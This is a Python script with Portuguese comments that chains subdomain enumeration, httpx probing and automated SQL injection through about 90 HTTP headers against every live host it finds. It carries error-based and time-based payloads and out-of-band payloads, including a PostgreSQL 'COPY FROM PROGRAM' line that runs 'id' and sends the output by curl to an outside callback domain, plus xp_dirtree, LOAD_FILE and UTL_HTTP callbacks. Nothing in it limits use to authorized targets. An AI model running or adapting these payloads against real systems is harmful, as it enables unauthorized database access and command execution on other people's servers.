#!/usr/bin/env python3
"""
recon_sqli_pipeline.py
────────────────────────────────────────────────────────────────────
Pipeline completo de recon + SQLi via headers HTTP

Fases
  1. Enumeração  — subfinder, assetfinder, github-subdomains, chaos
  2. Dedup       — sort + unique via set()
  3. Validação   — httpx (subprocess) → salva apenas hosts vivos
  4. Scan        — SQLi error-based, time-based e OOB (Interactsh)

Dependências externas (Go tools — devem estar no PATH):
  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  go install -v github.com/tomnomnom/assetfinder@latest
  go install -v github.com/gwen001/github-subdomains@latest
  go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest
  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

Dependências Python:
  pip install requests --break-system-packages

Uso:
  python3 recon_sqli_pipeline.py -d example.com
  python3 recon_sqli_pipeline.py -d example.com --oob abc.oast.live --github-token ghp_xxx
  python3 recon_sqli_pipeline.py -d example.com --skip-recon --alive alive.txt
  python3 recon_sqli_pipeline.py -d example.com --only-recon
"""

import argparse
import os
import re
import shutil
import statistics
import subprocess
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

# ══════════════════════════════════════════════════════════════════
#  CORES / OUTPUT
# ══════════════════════════════════════════════════════════════════

R  = "\033[91m"   # vermelho
Y  = "\033[93m"   # amarelo
G  = "\033[92m"   # verde
C  = "\033[96m"   # ciano
M  = "\033[95m"   # magenta
B  = "\033[94m"   # azul
DIM = "\033[2m"
RST = "\033[0m"
BO  = "\033[1m"

def banner():
    print(f"""{B}
  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
  {RST}{DIM}  recon → httpx → SQLi header scan         v2.0{RST}
""")

def info(msg):  print(f"{B}[*]{RST} {msg}")
def ok(msg):    print(f"{G}[+]{RST} {msg}")
def warn(msg):  print(f"{Y}[!]{RST} {msg}")
def err(msg):   print(f"{R}[-]{RST} {msg}")
def hit(msg):   print(f"{M}[HIT]{RST} {msg}")

# ══════════════════════════════════════════════════════════════════
#  VERIFICAÇÃO DE FERRAMENTAS
# ══════════════════════════════════════════════════════════════════

TOOLS = {
    "subfinder":         "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    "assetfinder":       "go install github.com/tomnomnom/assetfinder@latest",
    "github-subdomains": "go install github.com/gwen001/github-subdomains@latest",
    "chaos":             "go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest",
    "httpx":             "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
}

def check_tools(required: list[str]) -> bool:
    missing = [t for t in required if not shutil.which(t)]
    if missing:
        err(f"Ferramentas não encontradas no PATH: {', '.join(missing)}")
        for t in missing:
            print(f"  instale: {TOOLS.get(t, 'ver documentação')}")
        return False
    return True

# ══════════════════════════════════════════════════════════════════
#  FASE 1 — ENUMERAÇÃO DE SUBDOMÍNIOS
# ══════════════════════════════════════════════════════════════════

def run_tool(cmd: list[str], tool_name: str, timeout: int = 300) -> set[str]:
    """Executa ferramenta de recon e retorna conjunto de subdomínios."""
    results: set[str] = set()
    try:
        info(f"Rodando {tool_name}...")
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        for line in proc.stdout.splitlines():
            line = line.strip().lower()
            # aceita apenas linhas que parecem subdomínios
            if line and re.match(r'^[a-z0-9*._-]+\.[a-z]{2,}$', line):
                results.add(line)
        ok(f"{tool_name}: {len(results)} subdomínios")
    except subprocess.TimeoutExpired:
        warn(f"{tool_name}: timeout após {timeout}s")
    except FileNotFoundError:
        warn(f"{tool_name}: não encontrado no PATH — pulando")
    except Exception as e:
        warn(f"{tool_name}: erro — {e}")
    return results


def enumerate_subdomains(
    domain: str,
    output_dir: Path,
    github_token: str | None,
    chaos_key: str | None,
    threads: int,
) -> set[str]:
    all_subs: set[str] = set()

    # ── subfinder ─────────────────────────────────────────────────
    subs = run_tool(
        ["subfinder", "-d", domain, "-silent", "-all"],
        "subfinder",
    )
    all_subs |= subs

    # ── assetfinder ───────────────────────────────────────────────
    subs = run_tool(
        ["assetfinder", "--subs-only", domain],
        "assetfinder",
    )
    all_subs |= subs

    # ── github-subdomains ─────────────────────────────────────────
    if github_token:
        subs = run_tool(
            ["github-subdomains", "-d", domain, "-t", github_token, "-raw"],
            "github-subdomains",
        )
    else:
        warn("github-subdomains: pulado (sem --github-token)")
        subs = set()
    all_subs |= subs

    # ── chaos ─────────────────────────────────────────────────────
    if chaos_key:
        subs = run_tool(
            ["chaos", "-d", domain, "-key", chaos_key, "-silent"],
            "chaos",
        )
    elif shutil.which("chaos"):
        # tenta sem key (usa PDCP_API_KEY do ambiente, se existir)
        env_key = os.environ.get("PDCP_API_KEY") or os.environ.get("CHAOS_KEY")
        if env_key:
            subs = run_tool(
                ["chaos", "-d", domain, "-key", env_key, "-silent"],
                "chaos",
            )
        else:
            warn("chaos: pulado (sem --chaos-key e sem PDCP_API_KEY/CHAOS_KEY no ambiente)")
            subs = set()
    else:
        subs = set()
    all_subs |= subs

    # ── filtra só subdomínios do alvo ─────────────────────────────
    all_subs = {s for s in all_subs if s.endswith(f".{domain}") or s == domain}

    ok(f"Total único após dedup: {len(all_subs)} subdomínios")

    # Salva lista bruta
    raw_file = output_dir / "subdomains_raw.txt"
    raw_file.write_text("\n".join(sorted(all_subs)))
    info(f"Subdomínios salvos em: {raw_file}")

    return all_subs

# ══════════════════════════════════════════════════════════════════
#  FASE 3 — VALIDAÇÃO COM HTTPX
# ══════════════════════════════════════════════════════════════════

def validate_with_httpx(
    subdomains: set[str],
    output_dir: Path,
    httpx_threads: int = 50,
    timeout: int = 10,
) -> list[dict]:
    """
    Usa httpx para provar cada subdomínio e retorna lista de hosts vivos
    com metadados (URL, status, título, tecnologias detectadas).
    """
    if not subdomains:
        warn("Nenhum subdomínio para validar")
        return []

    # Escreve lista temporária de input
    input_file  = output_dir / "subdomains_raw.txt"
    output_file = output_dir / "httpx_output.txt"

    info(f"Validando {len(subdomains)} subdomínios com httpx...")

    cmd = [
        "httpx",
        "-l",        str(input_file),
        "-o",        str(output_file),
        # sem -silent: deixa o httpx escrever no stdout normalmente;
        # o arquivo -o receberá as linhas JSON independentemente
        "-status-code",
        "-title",
        "-tech-detect",
        "-follow-redirects",
        "-threads",  str(httpx_threads),
        "-timeout",  str(timeout),
        "-json",
        "-no-color",
    ]

    stdout_lines: list[str] = []
    try:
        # Captura stdout E grava em -o simultaneamente
        proc = subprocess.run(cmd, timeout=600, check=False,
                              capture_output=True, text=True)
        stdout_lines = proc.stdout.splitlines()
        # Imprime no terminal para o usuário acompanhar
        for l in stdout_lines:
            if l.strip():
                print(f"  {l}", flush=True)
    except subprocess.TimeoutExpired:
        warn("httpx: timeout global — usando resultados parciais")
    except FileNotFoundError:
        err("httpx não encontrado — instale: go install github.com/projectdiscovery/httpx/cmd/httpx@latest")
        return _fallback_probe(subdomains)

    # ── Parse JSON lines ──────────────────────────────────────────
    # Prioridade: arquivo -o → stdout capturado
    # httpx moderno: campo "status_code" (underscore)
    # httpx legado:  campo "status-code" (hífen)
    alive: list[dict] = []
    raw_lines: list[str] = []

    if output_file.exists() and output_file.stat().st_size > 0:
        raw_lines = output_file.read_text(errors="replace").splitlines()
        info(f"httpx: lendo {len(raw_lines)} linhas de {output_file.name}")
    elif stdout_lines:
        # arquivo vazio mas stdout tem dados — usa o stdout diretamente
        raw_lines = stdout_lines
        warn(f"httpx: arquivo -o vazio, usando stdout ({len(raw_lines)} linhas)")
        # salva no arquivo para referência futura
        output_file.write_text("\n".join(raw_lines))
    else:
        warn("httpx: sem saída — verifique se o binário está atualizado")

    import json as _json
    for line in raw_lines:
        line = line.strip()
        if not line:
            continue
        try:
            obj = _json.loads(line)
            # aceita status_code (novo) ou status-code (legado)
            status = obj.get("status_code") or obj.get("status-code") or 0
            if not status:
                continue
            url = obj.get("url", "").strip()
            if not url:
                continue
            alive.append({
                "url":    url,
                "status": int(status),
                "title":  obj.get("title", ""),
                "tech":   obj.get("tech", []),
                "cdn":    obj.get("cdn", False),
                "cdn_name": obj.get("cdn_name", ""),
            })
        except (_json.JSONDecodeError, ValueError):
            # linha pode ser URL pura em versões antigas do httpx
            if line.startswith("http"):
                alive.append({"url": line, "status": 200, "title": "", "tech": [],
                               "cdn": False, "cdn_name": ""})

    ok(f"Hosts vivos: {len(alive)}")

    # Salva alive.txt (URLs puras para uso externo)
    alive_file = output_dir / "alive.txt"
    alive_file.write_text("\n".join(h["url"] for h in alive))
    info(f"Hosts vivos salvos em: {alive_file}")

    return alive


def _fallback_probe(subdomains: set[str]) -> list[dict]:
    """
    Probe manual com requests quando httpx não está disponível.
    Mais lento, mas funcional.
    """
    warn("Usando probe manual com requests (httpx não disponível)")
    alive = []
    lock  = threading.Lock()

    def probe(sub: str):
        for scheme in ["https://", "http://"]:
            url = scheme + sub
            try:
                r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
                with lock:
                    alive.append({"url": url, "status": r.status_code, "title": "", "tech": []})
                return
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(probe, subdomains))

    return alive

# ══════════════════════════════════════════════════════════════════
#  PAYLOADS SQLi
# ══════════════════════════════════════════════════════════════════

IGNORED_STATUS = [401, 403, 404, 429]

HEADERS_LIST = [
    # Forwarding clássico
    "X-Forwarded-For", "Forwarded", "X-Real-IP", "X-Forwarded", "X-Forwarded-By",
    "X-Forwarded-Host", "X-Forwarded-Server", "X-Forwarded-Port",
    "X-Forwarded-Proto", "X-Forwarded-Scheme", "X-Forwarded-SSL",
    # CDNs
    "CF-Connecting-IP", "True-Client-IP", "Fastly-Client-IP",
    "X-Azure-ClientIP", "X-Azure-SocketIP", "X-Google-Real-IP",
    "CloudFront-Viewer-Address", "CloudFront-Viewer-Country", "X-Amzn-Trace-Id",
    "X-Edge-IP", "X-Cdn-Client-Ip", "X-Bb-Ip", "X-Sucuri-Clientip",
    "X-Imperva-Client-IP", "X-NF-Client-Connection-IP", "X-Vercel-Forwarded-For",
    "Fly-Client-IP", "X-Shopify-Client-Ip", "Akamai-Origin-Hop", "X-Akamai-Client-IP",
    # Proxy / LB
    "X-Client-IP", "X-Cluster-Client-IP", "X-ProxyUser-IP",
    "WL-Proxy-Client-IP", "Proxy-Client-IP", "X-Original-Forwarded-For",
    "X-Originating-IP", "X-Original-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Original-Remote-Addr", "Client-IP", "Client-IP-Addr", "Remote-Addr",
    "Remote-IP", "Real-IP", "X-Proxy-IP", "X-Forwarded-For-Original",
    "Forwarded-For", "X-Forwarded-For-IP", "X-Forwarded-For-Client-IP",
    "X-Forwarded-For-Remote-Addr",
    # Auth / session
    "X-Custom-IP-Authorization", "X-User-IP", "X-Client-IP-Addr",
    "X-Client-Address", "X-Remote-User-IP", "X-Remote-User-Addr",
    "X-Auth-Token", "Authorization",
    # HTTPS / rewrite
    "Front-End-Https", "X-HTTPS", "X-Original-URL", "X-Rewrite-URL",
    "X-Override-URL", "X-HTTP-Method-Override",
    # Geo / analytics
    "X-Country-Code", "CF-IPCountry", "X-GeoIP-Country", "X-Geo-Country",
    "X-Language", "Accept-Language", "Referer", "Origin",
    # Identificadores / correlação
    "X-Request-ID", "X-Correlation-ID", "X-Session-ID", "X-Transaction-ID",
    # Debug
    "X-Debug", "X-Debug-Token", "X-Dev-Mode",
    # WAF bypass
    "Via", "X-Host", "Pragma", "X-Scanner", "X-Scan-Memo", "X-Custom-Header",
    # User-Agent variants
    "User-Agent", "X-Device-User-Agent", "X-Original-User-Agent",
    "X-ATT-DeviceId", "X-Operamini-Phone-Ua",
]

ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'--",
    "' OR 1=1--",
    "1' AND 1=CONVERT(int,@@version)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=CAST(version() AS int)--",
    "' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))--",
]

TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -", "' OR pg_sleep(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)-- -",
    "1 AND SLEEP(5)-- -", "'||pg_sleep(5)--",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "mysql_fetch", "mysqli_fetch",
    "pg_query", "pg_exec", "sqlite error", "sqlite3",
    "ora-01756", "ora-00933", "ora-00907",
    "unclosed quotation mark", "quoted string not properly terminated",
    "syntax error at or near", "unterminated string literal",
    "invalid input syntax for", "column does not exist",
    "mssql", "microsoft ole db provider for sql server",
    "odbc sql server driver", "odbc microsoft access driver",
    "[sqlserver]", "[microsoft][odbc", "warning: mssql",
    "sybase", "db2 sql error", "sqlexception",
    "sql command not properly ended", "drithsx.sn",
    "extractvalue", "xpath syntax error", "xml path",
]

TIME_SLEEP        = 5
REPEAT_TIME_TESTS = 2

# ══════════════════════════════════════════════════════════════════
#  OOB PAYLOADS
# ══════════════════════════════════════════════════════════════════

def build_oob_payloads(oob_domain: str, marker: str) -> list[dict]:
    sub = f"{marker}.{oob_domain}"
    return [
        {"payload": f"' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT HEX(database())), '.{sub}\\\\a'))-- -",
         "db": "MySQL", "method": "dns"},
        {"payload": f"' UNION SELECT LOAD_FILE('\\\\\\\\{sub}\\\\x')-- -",
         "db": "MySQL", "method": "dns"},
        {"payload": f"' COPY (SELECT '') TO PROGRAM 'nslookup {sub}'-- -",
         "db": "PostgreSQL", "method": "dns"},
        {"payload": f"'; CREATE TABLE IF NOT EXISTS _oob(t text); COPY _oob FROM PROGRAM 'curl http://{sub}/$(id|base64)'-- -",
         "db": "PostgreSQL", "method": "http"},
        {"payload": f"'; EXEC master..xp_dirtree '\\\\{sub}\\x'-- -",
         "db": "MSSQL", "method": "dns"},
        {"payload": f"'; DECLARE @q varchar(300); SET @q='\\\\{sub}\\a'; EXEC master.dbo.xp_dirtree @q-- -",
         "db": "MSSQL", "method": "dns"},
        {"payload": f"' UNION SELECT UTL_HTTP.REQUEST('http://{sub}/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL-- -",
         "db": "Oracle", "method": "http"},
        {"payload": f"' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{sub}') FROM DUAL-- -",
         "db": "Oracle", "method": "dns"},
    ]

def _slugify(s: str) -> str:
    return re.sub(r"[^a-z0-9]", "-", s.lower())[:20]

# ══════════════════════════════════════════════════════════════════
#  CORE SCAN
# ══════════════════════════════════════════════════════════════════

def request_once(url: str, headers: dict | None = None, timeout: int = 15) -> dict:
    start = time.time()
    try:
        r = requests.get(
            url, headers=headers or {}, timeout=timeout,
            verify=False, allow_redirects=True,
        )
        return {"ok": True, "status": r.status_code,
                "text": (r.text or "").lower(), "elapsed": time.time() - start}
    except Exception:
        return {"ok": False, "status": 0, "text": "", "elapsed": time.time() - start}


def get_baseline(url: str) -> dict | None:
    times, texts = [], []
    for _ in range(3):
        r = request_once(url, timeout=15)
        if r["ok"]:
            times.append(r["elapsed"])
            texts.append(r["text"])
        time.sleep(0.4)
    if not times:
        return None
    return {"time": statistics.mean(times), "texts": texts}


def has_sql_error(resp: dict, baseline_texts: list[str]) -> tuple[bool, str | None]:
    for sig in ERROR_SIGNATURES:
        if sig in resp["text"]:
            if not any(sig in b for b in baseline_texts):
                return True, sig
    return False, None


def build_curl(url: str, header: str, payload: str) -> str:
    escaped = payload.replace("'", "'\\''")
    return (f'curl -i -s -k "{url}" \\\n'
            f'  -H "{header}: {escaped}" \\\n'
            f'  -H "User-Agent: Mozilla/5.0"')


def test_error_based(url: str, header: str, baseline: dict) -> list[dict]:
    findings = []
    for payload in ERROR_PAYLOADS:
        resp = request_once(url, headers={header: payload})
        if not resp["ok"] or resp["status"] in IGNORED_STATUS:
            continue
        has_err, sig = has_sql_error(resp, baseline["texts"])
        if has_err:
            findings.append({"type": "ERROR", "header": header, "payload": payload,
                              "confidence": "HIGH", "reason": f"SQL error: '{sig}'",
                              "curl": build_curl(url, header, payload)})
    return findings


def test_time_based(url: str, header: str, baseline: dict) -> list[dict]:
    findings = []
    for payload in TIME_PAYLOADS:
        delays = []
        for _ in range(REPEAT_TIME_TESTS):
            resp = request_once(url, headers={header: payload}, timeout=20)
            if not resp["ok"] or resp["status"] in IGNORED_STATUS:
                continue
            delays.append(resp["elapsed"])
            time.sleep(0.3)
        if not delays:
            continue
        avg  = statistics.mean(delays)
        thr  = baseline["time"] + TIME_SLEEP - 1
        if avg >= thr:
            findings.append({"type": "TIME", "header": header, "payload": payload,
                              "confidence": "MEDIUM",
                              "reason": f"Delay {avg:.2f}s vs baseline {baseline['time']:.2f}s",
                              "curl": build_curl(url, header, payload)})
    return findings


def test_oob(url: str, header: str, oob_domain: str) -> list[dict]:
    findings = []
    marker   = uuid.uuid4().hex[:8]
    for entry in build_oob_payloads(oob_domain, f"{marker}-{_slugify(header)}"):
        resp = request_once(url, headers={header: entry["payload"]}, timeout=20)
        if not resp["ok"] or resp["status"] in IGNORED_STATUS:
            continue
        findings.append({
            "type":       "OOB",
            "header":     header,
            "payload":    entry["payload"],
            "confidence": "CRITICAL",
            "reason":     f"{entry['db']} {entry['method'].upper()} OOB — marker: {marker}",
            "marker":     marker,
            "oob_domain": oob_domain,
            "curl":       build_curl(url, header, entry["payload"]),
        })
    return findings


def test_header(url: str, header: str, baseline: dict, oob_domain: str | None) -> list[dict]:
    out = []
    out.extend(test_error_based(url, header, baseline))
    out.extend(test_time_based(url, header, baseline))
    if oob_domain:
        out.extend(test_oob(url, header, oob_domain))
    return out


def scan_target(url: str, threads: int, oob_domain: str | None) -> list[dict]:
    baseline = get_baseline(url)
    if not baseline:
        err(f"Baseline falhou: {url}")
        return []

    results = []
    lock    = threading.Lock()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_header, url, h, baseline, oob_domain): h
                   for h in HEADERS_LIST}
        done, total = 0, len(futures)

        for f in as_completed(futures):
            done += 1
            try:
                res = f.result()
            except Exception:
                res = []
            if res:
                with lock:
                    results.extend(res)
                for item in res:
                    hit(f"{item['confidence']:8s} | {futures[f]:35s} | {item['type']} | {url}")

            if done % 15 == 0 or done == total:
                pct = int(done / total * 100)
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                print(f"\r    [{bar}] {pct:3d}%  ({url})", end="", flush=True)

    print()
    return results

# ══════════════════════════════════════════════════════════════════
#  REPORT
# ══════════════════════════════════════════════════════════════════

SVCOL = {"HIGH": R, "MEDIUM": Y, "CRITICAL": M, "LOW": C}

def print_finding(item: dict, idx: int, url: str):
    col = SVCOL.get(item["confidence"], C)
    print(f"\n{BO}{'─'*60}{RST}")
    print(f"{BO}[#{idx}] {col}{item['confidence']}{RST} — {item['type']} @ {url}")
    print(f"  Header  : {item['header']}")
    print(f"  Payload : {item['payload'][:110]}")
    print(f"  Motivo  : {item['reason']}")
    if item["type"] == "OOB":
        print(f"\n  {BO}Interactsh — aguarde callback:{RST}")
        print(f"    marker     : {item['marker']}")
        print(f"    comando    : interactsh-client -s {item['oob_domain']}")
    print(f"\n  {BO}cURL PoC:{RST}")
    for line in item["curl"].split("\n"):
        print(f"    {line}")


def save_report(all_findings: dict[str, list], output_dir: Path):
    """Salva relatório markdown."""
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = output_dir / f"report_{ts}.md"
    lines = [f"# SQLi Header Scan Report\n\n**Data:** {datetime.now().isoformat()}\n"]

    total = sum(len(v) for v in all_findings.values())
    lines.append(f"**Total de findings:** {total}\n\n---\n")

    for url, findings in all_findings.items():
        if not findings:
            continue
        lines.append(f"\n## {url}\n")
        for i, f in enumerate(findings, 1):
            lines.append(
                f"### [{f['confidence']}] {f['type']} — {f['header']}\n\n"
                f"- **Payload:** `{f['payload'][:100]}`\n"
                f"- **Motivo:** {f['reason']}\n\n"
                f"```bash\n{f['curl']}\n```\n"
            )

    path.write_text("\n".join(lines))
    ok(f"Relatório salvo: {path}")

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Pipeline: recon → httpx → SQLi header scan",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  %(prog)s -d example.com
  %(prog)s -d example.com --oob abc.oast.live --github-token ghp_xxx
  %(prog)s -d example.com --skip-recon --alive alive.txt
  %(prog)s -d example.com --only-recon
  %(prog)s -d example.com --chaos-key MINHACHAVE --threads 15
        """,
    )
    # alvo
    parser.add_argument("-d",  "--domain",    required=True, help="Domínio raiz (ex: example.com)")

    # credenciais de recon
    parser.add_argument("--github-token", metavar="TOKEN",
                        help="GitHub PAT para github-subdomains")
    parser.add_argument("--chaos-key", metavar="KEY",
                        help="API key do ProjectDiscovery Chaos")

    # OOB
    parser.add_argument("--oob", metavar="INTERACTSH_DOMAIN",
                        help="Domínio OOB do Interactsh (ex: abc.oast.live)")

    # controle de fluxo
    parser.add_argument("--skip-recon", action="store_true",
                        help="Pula recon; usa --alive como entrada")
    parser.add_argument("--only-recon", action="store_true",
                        help="Roda só recon + httpx, sem scan SQLi")
    parser.add_argument("--alive", metavar="FILE",
                        help="Arquivo com URLs vivas (uma por linha) para pular recon+httpx")

    # performance
    parser.add_argument("--threads",       type=int, default=5,
                        help="Threads por alvo no scan SQLi (padrão: 5)")
    parser.add_argument("--httpx-threads", type=int, default=50,
                        help="Threads do httpx (padrão: 50)")

    # output
    parser.add_argument("--output-dir", metavar="DIR", default=None,
                        help="Diretório de saída (padrão: ./recon_<domain>_<ts>)")

    args = parser.parse_args()
    banner()

    # Diretório de saída
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    odir = Path(args.output_dir) if args.output_dir else Path(f"recon_{args.domain}_{ts}")
    odir.mkdir(parents=True, exist_ok=True)
    info(f"Saída em: {odir.resolve()}")

    # ── FLUXO PRINCIPAL ───────────────────────────────────────────

    alive_hosts: list[dict] = []

    if args.alive:
        # modo: arquivo de hosts vivos fornecido pelo usuário
        alive_file = Path(args.alive)
        if not alive_file.exists():
            err(f"Arquivo não encontrado: {alive_file}")
            sys.exit(1)
        urls = [u.strip() for u in alive_file.read_text().splitlines() if u.strip()]
        alive_hosts = [{"url": u, "status": 0, "title": "", "tech": []} for u in urls]
        ok(f"Carregadas {len(alive_hosts)} URLs de {alive_file}")

    elif not args.skip_recon:
        # ── FASE 1: enumeração ────────────────────────────────────
        required = ["subfinder", "assetfinder", "httpx"]
        if args.github_token:
            required.append("github-subdomains")
        if not check_tools(required):
            sys.exit(1)

        print(f"\n{BO}{'═'*60}{RST}")
        print(f"{BO}Fase 1 — Enumeração de subdomínios: {args.domain}{RST}")
        print(f"{'═'*60}")

        subdomains = enumerate_subdomains(
            domain=args.domain,
            output_dir=odir,
            github_token=args.github_token,
            chaos_key=args.chaos_key,
            threads=args.threads,
        )

        if not subdomains:
            err("Nenhum subdomínio encontrado")
            sys.exit(1)

        # ── FASE 2: dedup (já feito no enumerate_subdomains) ──────
        # ── FASE 3: httpx ─────────────────────────────────────────
        print(f"\n{BO}{'═'*60}{RST}")
        print(f"{BO}Fase 3 — Validação com httpx{RST}")
        print(f"{'═'*60}")

        alive_hosts = validate_with_httpx(
            subdomains=subdomains,
            output_dir=odir,
            httpx_threads=args.httpx_threads,
        )

    if args.only_recon:
        ok("--only-recon: encerrando antes do scan SQLi")
        sys.exit(0)

    if not alive_hosts:
        warn("Nenhum host vivo para escanear")
        sys.exit(0)

    # ── FASE 4: scan SQLi ─────────────────────────────────────────
    print(f"\n{BO}{'═'*60}{RST}")
    print(f"{BO}Fase 4 — SQLi Header Scan{RST}")
    if args.oob:
        print(f"{DIM}  OOB domain : {args.oob}{RST}")
        print(f"{DIM}  certifique-se: interactsh-client -s {args.oob}{RST}")
    print(f"{'═'*60}")

    all_findings: dict[str, list] = {}
    grand_total = 0

    for host in alive_hosts:
        url = host["url"]
        raw_tech = host.get("tech", []) or []
        if raw_tech and isinstance(raw_tech[0], dict):
            tech_str = ", ".join(t.get("name", str(t)) for t in raw_tech)
        else:
            tech_str = ", ".join(str(t) for t in raw_tech) if raw_tech else "—"
        cdn_info = f"  CDN:{host.get('cdn_name','')}" if host.get("cdn") else ""
        print(f"\n{BO}[>]{RST} {url}  {DIM}[{host['status']}] {host.get('title','')[:50]}  tech:{tech_str}{cdn_info}{RST}")

        findings = scan_target(url, args.threads, args.oob)
        all_findings[url] = findings
        grand_total += len(findings)

        if findings:
            for i, item in enumerate(findings, 1):
                print_finding(item, i, url)
        else:
            info(f"Sem findings em {url}")

    # ── SUMÁRIO FINAL ─────────────────────────────────────────────
    print(f"\n{BO}{'═'*60}{RST}")
    print(f"{BO}SUMÁRIO FINAL{RST}")
    print(f"{'═'*60}")
    print(f"  Domínio   : {args.domain}")
    print(f"  Hosts vivos : {len(alive_hosts)}")
    print(f"  Findings  : {grand_total}")
    if args.oob:
        oob_total = sum(1 for v in all_findings.values() for f in v if f["type"] == "OOB")
        print(f"  OOB disparados : {oob_total}  →  confirme em interactsh-client")

    by_type: dict[str, int] = {}
    for findings in all_findings.values():
        for f in findings:
            by_type[f["type"]] = by_type.get(f["type"], 0) + 1
    for t, n in sorted(by_type.items()):
        print(f"    {t}: {n}")

    save_report(all_findings, odir)
    print(f"{'═'*60}")


if __name__ == "__main__":
    main()
